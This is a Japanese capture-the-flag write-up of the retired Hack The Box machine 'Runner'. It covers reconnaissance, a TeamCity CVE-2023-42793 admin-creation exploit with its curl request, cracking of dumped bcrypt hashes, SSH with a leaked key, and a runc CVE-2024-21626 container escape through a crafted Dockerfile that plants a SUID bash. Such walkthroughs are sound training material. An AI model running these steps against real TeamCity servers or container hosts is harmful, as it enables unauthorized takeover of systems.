# Runner

Linux · Medium

# 初期調査
## nmap
```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ nmap -sC -sV 10.10.11.13    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-01 14:31 JST
Nmap scan report for 10.10.11.13
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.04 seconds
```

## 名前解決
```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ echo "10.10.11.13 runner.htb" | sudo tee -a /etc/hosts      
[sudo] password for kali: 
10.10.11.13 runner.htb
```

## サブドメイン探索

```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 614ms]
```
teamcityが見つかったので名前解決追加しておく

アクセスするログインページに移る

http://teamcity.runner.htb/login.html

![](image.png)


teamcity
Version 2023.05.3 (build 129390)
を検索するとCVE-2023-42793が見つかる


# CVE-2023-42793

https://github.com/B4l3rI0n/CVE-2023-42793

TeamCityサーバー上に管理者アカウントを作成することができる

```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ git clone https://github.com/B4l3rI0n/CVE-2023-42793.git     
Cloning into 'CVE-2023-42793'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 50 (delta 12), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (50/50), 19.63 KiB | 1.51 MiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                                                           
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ cd CVE-2023-42793 
                                                                                                           
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner/CVE-2023-42793]
└─$ ls
exploit.py  rce.py  README.md  requirements.txt
```

Exploit実行

```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner/CVE-2023-42793]
└─$ python3 exploit.py -u http://teamcity.runner.htb -v                 

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.TG9aR0t2ZGlQMXVkSTFTbkx3aE40RVVCRGdF.MTUwN2QyZTYtNTczNC00OWRjLThjMGQtMjc3YzIyMmEwZGQ2
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb
Username: admin.QUZ8
Password: Password@123
Final curl command: curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.TG9aR0t2ZGlQMXVkSTFTbkx3aE40RVVCRGdF.MTUwN2QyZTYtNTczNC00OWRjLThjMGQtMjc3YzIyMmEwZGQ2" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "admin.QUZ8", "password": "Password@123", "email": "admin.QUZ8@lol.omg", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'

```

作成された認証情報でログインする

Username: `admin.QUZ8`
Password: `Password@123`


![](image-1.png)


http://teamcity.runner.htb/admin/admin.html?item=backup


![](image-2.png)

buckupする

/database_dump/usersにユーザ一覧を発見

```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner/database_dump]
└─$ sudo cat users 
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1746078736041, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, admin.quz8, $2a$07$AEderTpDWX/DMV3KB2E6UO0HBvbbDAbASLeDMpC3xjA2L9eyNnNEu, , admin.QUZ8@lol.omg, 1746078761072, BCRYPT
```

## john
```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?) 
```

matthew : `piper123`

# 初期侵入

## SSH

/projects/AllProjects/pluginData/ssh_keysにis_rsaがあったのでjohnとmatthewでSSH試ししてみる
SSHの秘密鍵を使ってjohnで接続する

```
┌──(kali㉿kali)-[~/…/projects/AllProjects/pluginData/ssh_keys]
└─$ sudo ssh -i id_rsa john@10.10.11.13                 
The authenticity of host '10.10.11.13 (10.10.11.13)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.13' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu May  1 06:09:23 AM UTC 2025

  System load:                      0.22119140625
  Usage of /:                       79.9% of 9.74GB
  Memory usage:                     38%
  Swap usage:                       0%
  Processes:                        221
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.13
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:aadf

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

john@runner:~$ whoami
john
```

成功した

```
john@runner:~$ ls
user.txt
john@runner:~$ cat user.txt 
d22*****************************
```

## user.txt

`d22*****************************`

```
john@runner:/etc/nginx/sites-enabled$ ls
default  portainer  teamcity
john@runner:/etc/nginx/sites-enabled$ cat portainer 
server {
    listen 80;
    server_name portainer-administration.runner.htb;

    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}

```


```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Runner]
└─$ echo "10.10.11.13 portainer-administration.runner.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.10.11.13 portainer-administration.runner.htb
```


![](image-3.png)



ログイン成功

![](image-4.png)



![](image-5.png)


```
john@runner:/home$ runc --version
runc version 1.1.7-0ubuntu1~22.04.1
spec: 1.0.2-dev
go: go1.18.1
libseccomp: 2.5.3

```

# CVE-2024-21626

>runc は、OCI 仕様に従って Linux 上でコンテナを生成・実行するための CLI ツールです。runc 1.1.11 以前では、内部ファイル記述子のリークにより、攻撃者が新たに生成されたコンテナプロセス（runc exec から）にホストファイルシステムの名前空間に作業ディレクトリを作成させ、ホストファイルシステムへのアクセスを許可することでコンテナのエスケープを許す可能性


```
john@runner:~$ mkdir -p /tmp/exploit
john@runner:~$ cp /bin/bash /tmp/exploit/bash
john@runner:~$ ls -la /tmp/exploit/
total 1372
drwxrwxr-x 2 john john    4096 May  1 06:31 .
drwxrwxrwt 8 root root    4096 May  1 06:30 ..
-rwxr-xr-x 1 john john 1396520 May  1 06:31 bash
```

Image -> Build a new imagesからDockerfileを編集

```
FROM ubuntu:latest
    WORKDIR /proc/self/fd/8
    RUN cd ../../../../../../../../ && chmod -R 777 tmp/exploit && chown -R root:root tmp/exploit && chmod u+s tmp/exploit/bash
```

![](image-6.png)

成功するとDockerfileに書いた命令が実行され、/tmp/exploit/bashにSUIDが設定される

```
john@runner:~$ ls -la /tmp/exploit/
total 1372
drwxrwxrwx 2 root root    4096 May  1 06:31 .
drwxrwxrwt 8 root root    4096 May  1 06:30 ..
-rwsrwxrwx 1 root root 1396520 May  1 06:31 bash
```

/tmp/exploit/bashを実行

```
john@runner:~$ /tmp/exploit/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
5c8*****************************
```
## root.txt

`5c8*****************************`